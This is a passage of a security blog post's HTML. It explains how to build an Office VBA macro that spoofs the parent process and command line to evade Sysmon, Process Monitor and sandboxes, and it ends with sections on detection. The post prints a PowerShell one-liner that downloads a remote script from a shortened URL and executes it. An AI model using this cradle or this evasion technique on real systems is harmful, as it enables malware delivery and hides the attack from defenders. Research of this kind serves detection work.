+<li>Retrieve the PEB address using <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess">NtQueryInformationProcess</a></li>
+<li>Overwrite the command line stored in the PEB using <a href="https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></li>
+<li>Resume the process</li>
+</ol>
+<p>This will cause Windows to log the command line provided in step (1), <span style="text-decoration: underline;">even though the process code will take into account the command line used to overwrite the original one in step (3)</span>. The full proof-of-concept code written by Adam Chester is available <a href="https://gist.github.com/xpn/1c51c2bfe19d33c169fe0431770f3020#file-argument_spoofing-cpp">on Github</a>.</p>
+<h1><span id="VBA_implementation">VBA implementation</span></h1>
+<h2><span id="Goal">Goal</span></h2>
+<p>These two proof-of-concept are pretty awesome &#8211; but what if we could achieve the same from within an Office macro, which is a classical (if not the most used) attack vector? It turns out we can call low-level Windows APIs directly from VBA code using <a href="https://en.wikipedia.org/wiki/Platform_Invocation_Services">P/Invoke</a>. As an example, if you wanted to call the function OpenProcess <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess">defined</a> as:</p>
+<pre class=""><code class="lang-cpp"><span class="hljs-function">HANDLE <span class="hljs-title">OpenProcess</span><span class="hljs-params">(
+  DWORD dwDesiredAccess,
+  BOOL  bInheritHandle,
+  DWORD dwProcessId
+)</span></span>;
+</code></pre>
+<p>&#8230; you&#8217;d need the following VBA snippet:</p>
+<p><script src="https://gist.github.com/christophetd/84af209baa3abf92944098ad583f5a33.js"></script></p>
+<p>&#8230; allowing you to easily make the call:</p>
+<p><script src="https://gist.github.com/christophetd/4220bdd2fd5f77905edd9d70fe00033e.js"></script></p>
+<p>This means that if we define all the necessary bindings and data structures inside our VBA code, we should be able to implement the two techniques described above to spawn a new process with a spoofed parent and command line.</p>
+<p>The plan is as follows:</p>
+<ol>
+<li>Retrieve the PID of a legitimate-looking process such as <em>explorer.exe</em></li>
+<li>Create a new process (such as <em>powershell.exe</em>) with this process as a parent, with a legitimate looking command line, and in a suspended state</li>
+<li>Overwrite the process command line in the PEB</li>
+<li>Resume the process</li>
+</ol>
+<p>As an illustration, the original command line we could be using is something like:</p>
+<div>
+<pre>powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName</pre>
+</div>
+<div>&#8230; which is just a powershell command to list running services whose name contains <em>network</em>. Then, we could overwrite it with a command line which would download a powershell payload from the Internet and execute it:</div>
+<div></div>
+<div></div>
+<div>
+<div>
+<pre>powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h'))</pre>
+</div>
+</div>
+<h2><span id="Result">Result</span></h2>
+<p>After almost a whole week-end trying to wrap my head around VisualBasic (which I had never used before), P/Invoke, and debugging arguably readable VBA errors, I managed to get the VBA implementation to work. Here it is!</p>
+<p style="text-align: center;"><strong><a href="https://github.com/christophetd/spoofing-office-macro">https://github.com/christophetd/spoofing-office-macro</a></strong></p>
+<p>Here is what Sysmon logs when the macro is executed:</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-powershell.png"><img loading="lazy" class="aligncenter size-full wp-image-772" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-powershell.png" alt="" width="822" height="411" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-powershell.png 822w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-powershell-300x150.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-powershell-768x384.png 768w" sizes="(max-width: 822px) 100vw, 822px" /></a></p>
+<p>&#8230; while the actual parent process is <em>WINWORD.exe</em>, and the actual command line being executed is <em>powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString(&#8216;http://bit.ly/2TxpA4h&#8217;))</em>. Tools like Process Monitor also fall for the trick:</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/procmon-ps-calc-annotated.png"><img loading="lazy" class="aligncenter size-full wp-image-774" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/procmon-ps-calc-annotated.png" alt="" width="926" height="364" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/procmon-ps-calc-annotated.png 926w, https://blog.christophetd.fr/wp-content/uploads/2019/03/procmon-ps-calc-annotated-300x118.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/procmon-ps-calc-annotated-768x302.png 768w" sizes="(max-width: 926px) 100vw, 926px" /></a></p>
+<h1><span id="Usage_in_the_wild">Usage in the wild</span></h1>
+<p>Malicious documents using similar spoofing techniques have been documented in several cases. I was able to find the following with a bit of googling:</p>
+<ul>
+<li><a href="http://www.pwncode.club/2018/08/macro-used-to-spoof-parent-process.html">http://www.pwncode.club/2018/08/macro-used-to-spoof-parent-process.html</a></li>
+<li><a href="https://twitter.com/tifkin_/status/900629117846028288">https://twitter.com/tifkin_/status/900629117846028288</a></li>
+<li><a href="https://pastebin.com/xc9668u8">https://pastebin.com/xc9668u8</a></li>
+</ul>
+<p>If you have additional samples (or a VT Enterprise subscription allowing you to retrieve <a href="https://www.virustotal.com/#/file/ecb0d5df442e54a31f9c926f10ff9abc0097760cbb4778a64cff6aee906f7c9c/detection">this one</a>), I&#8217;d be eager to take a look at them &#8211; feel free to <a href="https://twitter.com/christophetd">PM me.</a></p>
+<h1><span id="Detection">Detection</span></h1>
+<p>Countercept published <a href="https://www.countercept.com/blog/detecting-parent-pid-spoofing/">an article</a> describing how to detect parent PID spoofing.</p>
+<p>From a logging perspective, the implication of these techniques is that we cannot trust process creation events blindly. However, we have other options. First, we can enable <a href="https://sid-500.com/2017/08/16/monitoring-windows-powershell-enable-module-logging/">Powershell Module Logging</a> to get a runtime log of the powershell modules being called. Here, the following log entry would clearly indicate malicious activity.</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/ps-module-logging.png"><img loading="lazy" class="aligncenter size-full wp-image-778" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/ps-module-logging.png" alt="" width="904" height="381" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/ps-module-logging.png 904w, https://blog.christophetd.fr/wp-content/uploads/2019/03/ps-module-logging-300x126.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/ps-module-logging-768x324.png 768w" sizes="(max-width: 904px) 100vw, 904px" /></a></p>
+<p>Additionally, Sysmon (and most likely other EDR solutions) still logs the fact that powershell.exe is making a network connection, and shortly after spawning a process (calc.exe). This could also be considered as a suspicious behavior to raise alerts on.</p>
+<p>Finally, we can think about how such a threat could be identified earlier in an attack chain: caught by an IDS, detected by a mail gateway performing sandboxing, rendered useless on the endpoint if macros are disabled, etc.</p>
+<h1><span id="Anti-virus_detection">Anti-virus detection</span></h1>
+<p>At the time of writing, the detection rate on VirusTotal with no obfuscation is pretty high, 21/61 (<a href="https://www.virustotal.com/#/file-analysis/NWRlZTg4MzE3YzZlNWZlNTU5NWMyOWVkOTBiZGZmMjc6MTU1MjM0MTI4OQ==">analysis link</a>). However, purely dynamic analysis such as performed by Any.run does not detect malicious activity (<a href="https://app.any.run/tasks/07e26cb0-f08e-4f4e-a987-8fd5e51560b3">analysis link</a>) and marks the file as merely &#8220;Suspicious&#8221;. Here also, the parent and command line spoofing tricked the sandbox.</p>
+<figure id="attachment_802" aria-describedby="caption-attachment-802" style="width: 720px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1.png"><img loading="lazy" class="wp-image-802 size-large" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1-1024x266.png" alt="" width="720" height="187" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1-1024x266.png 1024w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1-300x78.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1-768x199.png 768w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run_-1.png 1113w" sizes="(max-width: 720px) 100vw, 720px" /></a><figcaption id="caption-attachment-802" class="wp-caption-text">&#8220;Suspicious&#8221; you say? 😉</figcaption></figure>
+<figure id="attachment_801" aria-describedby="caption-attachment-801" style="width: 419px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-processes.png"><img loading="lazy" class="wp-image-801 size-full" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-processes.png" alt="" width="419" height="204" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-processes.png 419w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-processes-300x146.png 300w" sizes="(max-width: 419px) 100vw, 419px" /></a><figcaption id="caption-attachment-801" class="wp-caption-text">Powershell.exe is showed with no parent</figcaption></figure>
+<figure id="attachment_800" aria-describedby="caption-attachment-800" style="width: 771px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-powershell.png"><img loading="lazy" class="wp-image-800 size-full" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-powershell.png" alt="" width="771" height="284" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-powershell.png 771w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-powershell-300x111.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/any.run-powershell-768x283.png 768w" sizes="(max-width: 771px) 100vw, 771px" /></a><figcaption id="caption-attachment-800" class="wp-caption-text">Any.run does not show the actual command line ran by Powershell</figcaption></figure>
+<p>Something a bit more advanced like Joe Sandbox, however, detects additional suspicious elements inside the file and classifies it at malicious. For instance, it detects that the powershell.exe process is spawned in a suspended state, which is by itself suspicious.</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/joe.png"><img loading="lazy" class="size-full wp-image-777" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/joe.png" alt="" width="887" height="113" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/joe.png 887w, https://blog.christophetd.fr/wp-content/uploads/2019/03/joe-300x38.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/joe-768x98.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></a></p>
+<p>&nbsp;</p>
+<h1><span id="Conclusion">Conclusion</span></h1>
+<p>Although process creation logs have a huge value for us as blue teamers, we should be careful not to trust them blindly. Having a wide range of available logs &#8211; windows, EDR, firewall, proxy, IDS, mail gateways &#8211; is likely what&#8217;s gonna allow us to find evil. As a red teamer or penetration tester, using these techniques can be handy to bypass EDR solutions that only rely on process creation logs.</p>
+<p>Thanks a lot for reading. I&#8217;d be very happy to continue the discussion on Twitter (<a href="https://twitter.com/christophetd/">@christophetd</a>). Feel free to shoot me a PM for any remark, question or error you might have spotted.</p>
+<div class="post-views post-759 entry-meta">
+				<span class="post-views-icon dashicons dashicons-chart-bar"></span>
+				<span class="post-views-label">Post Views: </span>
+				<span class="post-views-count">31,722</span>
+			</div>		<div class="wpulike wpulike-default " ><div class="wp_ulike_general_class wp_ulike_is_not_liked"><button type="button"
+					aria-label="Like Button"
+					data-ulike-id="759"
+					data-ulike-nonce="063687e92e"
+					data-ulike-type="post"
+					data-ulike-template="wpulike-default"
+					data-ulike-display-likers="0"
+					data-ulike-likers-style="popover"
+					class="wp_ulike_btn wp_ulike_put_image wp_post_btn_759"></button><span class="count-box">0</span>			</div></div>
+	<div class="addtoany_share_save_container addtoany_content addtoany_content_bottom"><div class="a2a_kit a2a_kit_size_32 addtoany_list" data-a2a-url="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" data-a2a-title="Building an Office macro to spoof parent processes and command line arguments"><a class="a2a_button_twitter_tweet addtoany_special_service" data-url="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" data-text="Building an Office macro to spoof parent processes and command line arguments"></a></div></div>
+	</div><!-- .entry-content -->
+
+	
+<footer class="entry-footer">
+
+				<span class="cat-links suri-gen-b sf-genericon genericon-category-sf">
+			Categories 			<a href="https://blog.christophetd.fr/category/security/" rel="category tag">Security</a>, <a href="https://blog.christophetd.fr/category/security/windows-security/" rel="category tag">Windows Security</a>		</span>
+	
+				<span class="tags-links suri-gen-b sf-genericon genericon-tag-sf" itemprop="keywords">
+			Tags 			<a href="https://blog.christophetd.fr/tag/offensive/" rel="tag">offensive</a>, <a href="https://blog.christophetd.fr/tag/windows/" rel="tag">windows</a>, <a href="https://blog.christophetd.fr/tag/windows-internals/" rel="tag">windows-internals</a>		</span>
+	
+</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+
+	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span>
+					<span class="screen-reader-text">Previous post:</span>
+					<span class="post-title">[Write-up] Insomni&#8217;hack 2018 CTF teaser</span></a></div><div class="nav-next"><a href="https://blog.christophetd.fr/stealthier-persistence-using-new-services-purposely-vulnerable-to-path-interception/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span>
+					<span class="screen-reader-text">Next post:</span>
+					<span class="post-title">Stealthier persistence using new services purposely vulnerable to path interception</span></a></div></div>
+	</nav>
+
+<div id="comments" class="comments-area">
+
+	
+		
+<h2 class="comments-title">
+	4 thoughts on &ldquo;<span>Building an Office macro to spoof parent processes and command line arguments</span>&rdquo;</h2>
+
+		<ol class="comment-list">
+
+			
+<li class="pingback">
+	<p>
+		Pingback:
+					<a href="https://blog.lowmillercg.com/building-an-office-macro-to-spoof-parent-processes-and-command-line-arguments/" class="url" itemprop="url"><span itemprop="name">Building an Office macro to spoof parent processes and command line arguments | | Lowmiller Consulting Group Blog</span></a>
+		
+			</p>
+
+</li><!-- #comment-## -->
+
+<li class="comment even thread-even depth-1" id="li-comment-11625">
+
+	<article id="comment-11625" class="comment-inner" itemscope="itemscope" itemtype="http://schema.org/Comment" itemprop="comment">
+
+		<header class="comment-header">
+
+			
+			<div class="comment-author" itemscope="itemscope" itemtype="http://schema.org/Person" itemprop="author">
+				<img alt='' src='https://secure.gravatar.com/avatar/d1a689d06884f52e6e130b406882d815?s=56&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d1a689d06884f52e6e130b406882d815?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' loading='lazy'/>
+									<span itemprop="name">Harvey</span>
+				
+			</div><!-- .comment-author .vcard -->
+
+			<div class="comment-meta">
+				<time datetime="2019-03-12T10:38:18+02:00" class="comment-time" itemprop="datePublished">
+					2 years ago				</time>
+			</div>
+
+		</header>
+
+		<div class="comment-content" itemprop="Text"><p>I think that&#8217;s because these tools detect &amp; log based on the lpCommandLine of CreateProcess, but smart ones knows that&#8217;s untrustable, they detect based on where they catch this CreateProcess call.		</p>
+<div class="wpulike wpulike-default ">
+<div class="wp_ulike_general_class wp_ulike_is_not_liked"><button type="button"
+					aria-label="Like Button"
+					data-ulike-id="11625"
+					data-ulike-nonce="45e9f955b6"
+					data-ulike-type="comment"
+					data-ulike-template="wpulike-default"
+					data-ulike-display-likers="0"
+					data-ulike-likers-style="popover"
+					class="wp_ulike_btn wp_ulike_put_image wp_comment_btn_11625"></button><span class="count-box">0</span>			</div>
+</div>
+</div>
+
+		<div class="comment-footer">
+			<a rel='nofollow' class='comment-reply-link' href='#comment-11625' data-commentid="11625" data-postid="759" data-belowelement="comment-11625" data-respondelement="respond" data-replyto="Reply to Harvey" aria-label='Reply to Harvey'>Reply</a>		</div>
+
+	</article><!-- #comment-## -->
+
+</li><!-- #comment-## -->
+
+<li class="pingback">
+	<p>
+		Pingback:
+					<a href="https://aeternusmalus.wordpress.com/2019/03/12/building-an-office-macro-to-spoof-parent-processes-and-command-line-arguments-christophe-tafani-dereeper/" class="url" itemprop="url"><span itemprop="name">Building an Office macro to spoof parent processes and command line arguments &#8211; Christophe Tafani-Dereeper &#8211; The Library 5.0</span></a>
+		
+			</p>
+
+</li><!-- #comment-## -->
+
+<li class="pingback">
+	<p>
+		Pingback:
+					<a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" class="url" itemprop="url"><span itemprop="name">Persistence: &#8220;the continued or prolonged existence of something&#8221;: Part 1 &#8211; Microsoft Office &#8211; MDSec</span></a>
+		
+			</p>
+
+</li><!-- #comment-## -->
+
+		</ol><!-- .comment-list -->
+
+		
+	
+		
+				<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/building-an-office-macro-to-spoof-process-parent-and-command-line/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://blog.christophetd.fr/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='759' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="d39b5f9748" /></p><input type="hidden" id="ak_js" name="ak_js" value="81"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
+		
+</div><!-- #comments -->
+
+
+		</main><!-- #main -->
+
+		
+	</div><!-- #primary -->
+
+
+<aside id="secondary" aria-label="Primary Sidebar" role="complementary" class="primary-sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
+	<h2 class="screen-reader-text">Primary Sidebar</h2>
+	<button aria-controls="secondary" aria-expanded="false" class="sidebar-toggle suri-gen-b sf-font-toggle-sf">
+		<span class="screen-reader-text">Toggle Sidebar</span>
+	</button>
+	<section id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><center>
+	<p><br />
+		Suggestion? Question? Comment? Drop me a line via <a href="mailto:&#x63;&#x68;&#x72;&#x69;&#x73;&#x74;&#x6f;&#x70;&#x68;&#x65;&#x40;&#x74;&#x61;&#x66;&#x61;&#x6e;&#x69;&#x2d;&#x64;&#x65;&#x72;&#x65;&#x65;&#x70;&#x65;&#x72;&#x2e;&#x6d;&#x65;">e-mail</a> or <a href="https://twitter.com/christophetd">Twitter</a>!
+	</p>
+	</center></div></section>
+		<section id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Latest Posts</h3>
+		<ul>
+											<li>
+					<a href="https://blog.christophetd.fr/shifting-cloud-security-left-scanning-infrastructure-as-code-for-security-issues/">Shifting Cloud Security Left — Scanning Infrastructure as Code for Security Issues</a>
+											<span class="post-date">20 December 2020</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/privilege-escalation-in-aws-elastic-kubernetes-service-eks-by-compromising-the-instance-role-of-worker-nodes/">Privilege Escalation in AWS Elastic Kubernetes Service (EKS) by compromising the instance role of worker nodes</a>
+											<span class="post-date">31 August 2020</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/automating-the-provisioning-of-active-directory-labs-in-azure/">Automating the provisioning of Active Directory labs in Azure</a>
+											<span class="post-date">8 June 2020</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/using-k3s-for-command-and-control-on-compromised-linux-hosts/">They told me I could be anything, so I became a Kubernetes node &#8211; Using K3s  for command and control on compromised Linux hosts</a>
+											<span class="post-date">30 March 2020</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/">Hidden in PEB Sight: Hiding Windows API Imports With a Custom Loader</a>
+											<span class="post-date">18 February 2020</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/stealthier-persistence-using-new-services-purposely-vulnerable-to-path-interception/">Stealthier persistence using new services purposely vulnerable to path interception</a>
+											<span class="post-date">31 August 2019</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" aria-current="page">Building an Office macro to spoof parent processes and command line arguments</a>
+											<span class="post-date">12 March 2019</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/">[Write-up] Insomni&#8217;hack 2018 CTF teaser</a>
+											<span class="post-date">22 January 2018</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/bypassing-cloudflare-using-internet-wide-scan-data/">CloudFlair: Bypassing Cloudflare using Internet-wide scan data</a>
+											<span class="post-date">18 January 2018</span>
+									</li>
+											<li>
+					<a href="https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/">Abusing the AWS metadata service using SSRF vulnerabilities</a>
+											<span class="post-date">18 June 2017</span>
+									</li>
+					</ul>
+
+		</section><section id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="https://blog.christophetd.fr/tag/aws/" class="tag-cloud-link tag-link-27 tag-link-position-1" style="font-size: 15.636363636364pt;" aria-label="aws (3 items)">aws</a>
+<a href="https://blog.christophetd.fr/tag/azure/" class="tag-cloud-link tag-link-29 tag-link-position-2" style="font-size: 8pt;" aria-label="azure (1 item)">azure</a>
+<a href="https://blog.christophetd.fr/tag/bash/" class="tag-cloud-link tag-link-13 tag-link-position-3" style="font-size: 8pt;" aria-label="bash (1 item)">bash</a>
+<a href="https://blog.christophetd.fr/tag/cloudflare/" class="tag-cloud-link tag-link-24 tag-link-position-4" style="font-size: 8pt;" aria-label="cloudflare (1 item)">cloudflare</a>
+<a href="https://blog.christophetd.fr/tag/git/" class="tag-cloud-link tag-link-14 tag-link-position-5" style="font-size: 8pt;" aria-label="git (1 item)">git</a>
+<a href="https://blog.christophetd.fr/tag/kubernetes/" class="tag-cloud-link tag-link-28 tag-link-position-6" style="font-size: 12.581818181818pt;" aria-label="kubernetes (2 items)">kubernetes</a>
+<a href="https://blog.christophetd.fr/tag/lab/" class="tag-cloud-link tag-link-30 tag-link-position-7" style="font-size: 12.581818181818pt;" aria-label="lab (2 items)">lab</a>
+<a href="https://blog.christophetd.fr/tag/linux/" class="tag-cloud-link tag-link-11 tag-link-position-8" style="font-size: 12.581818181818pt;" aria-label="linux (2 items)">linux</a>
+<a href="https://blog.christophetd.fr/tag/malware/" class="tag-cloud-link tag-link-33 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
+<a href="https://blog.christophetd.fr/tag/offensive/" class="tag-cloud-link tag-link-32 tag-link-position-10" style="font-size: 20.218181818182pt;" aria-label="offensive (5 items)">offensive</a>
+<a href="https://blog.christophetd.fr/tag/security/" class="tag-cloud-link tag-link-17 tag-link-position-11" style="font-size: 20.218181818182pt;" aria-label="security (5 items)">security</a>
+<a href="https://blog.christophetd.fr/tag/sftp/" class="tag-cloud-link tag-link-12 tag-link-position-12" style="font-size: 8pt;" aria-label="sftp (1 item)">sftp</a>
+<a href="https://blog.christophetd.fr/tag/windows/" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 15.636363636364pt;" aria-label="windows (3 items)">windows</a>
+<a href="https://blog.christophetd.fr/tag/windows-internals/" class="tag-cloud-link tag-link-31 tag-link-position-14" style="font-size: 12.581818181818pt;" aria-label="windows-internals (2 items)">windows-internals</a>
+<a href="https://blog.christophetd.fr/tag/write-up/" class="tag-cloud-link tag-link-18 tag-link-position-15" style="font-size: 22pt;" aria-label="write-up (6 items)">write-up</a></div>
+</section></aside><!-- #secondary -->
+		
+		</div><!-- #content -->
+
+		
+		<footer id="colophon" role="contentinfo" class="site-footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
+
+			
+<div class="footer-items">
+
+	<div class="copyright-text">
+					<p>Christophe Tafani-Dereeper &copy; 2021 . All Rights Reserved</p>
+			</div><!-- .copyright-text -->
+
+			<div class="site-credit">
+			Theme by <a href="http://surimohnot.me/suritheme" rel="nofollow">Suri</a>		</div><!-- .site-credit -->
+	
+</div><!-- .footer-items -->
+
+		</footer><!-- #colophon -->
+
+		
+		</div><!-- #page -->
+
+		<script type='text/javascript' id='toc-front-js-extra'>
+/* <![CDATA[ */
+var tocplus = {"visibility_show":"show","visibility_hide":"hide","width":"Auto"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/table-of-contents-plus/front.min.js?ver=2002' id='toc-front-js'></script>
+<script type='text/javascript' id='wp_ulike-js-extra'>
+/* <![CDATA[ */
+var wp_ulike_params = {"ajax_url":"https:\/\/blog.christophetd.fr\/wp-admin\/admin-ajax.php","notifications":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/wp-ulike/assets/js/wp-ulike.min.js?ver=4.4.7' id='wp_ulike-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/themes/suri/resources/js/scripts.js?ver=1.0.0' id='suri-scripts-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-includes/js/comment-reply.min.js?ver=5.7.2' id='comment-reply-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=SQYoCdokVVWAbJ5' id='enlighterjs-js'></script>
+<script type='text/javascript' id='enlighterjs-js-after'>
+!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":2,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"scroll","linenumbers":true,"theme":"beyond","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
+</script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-includes/js/wp-embed.min.js?ver=5.7.2' id='wp-embed-js'></script>
+<script async="async" type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/akismet/_inc/form.js?ver=4.1.9' id='akismet-form-js'></script>
+	</body>
+</html>
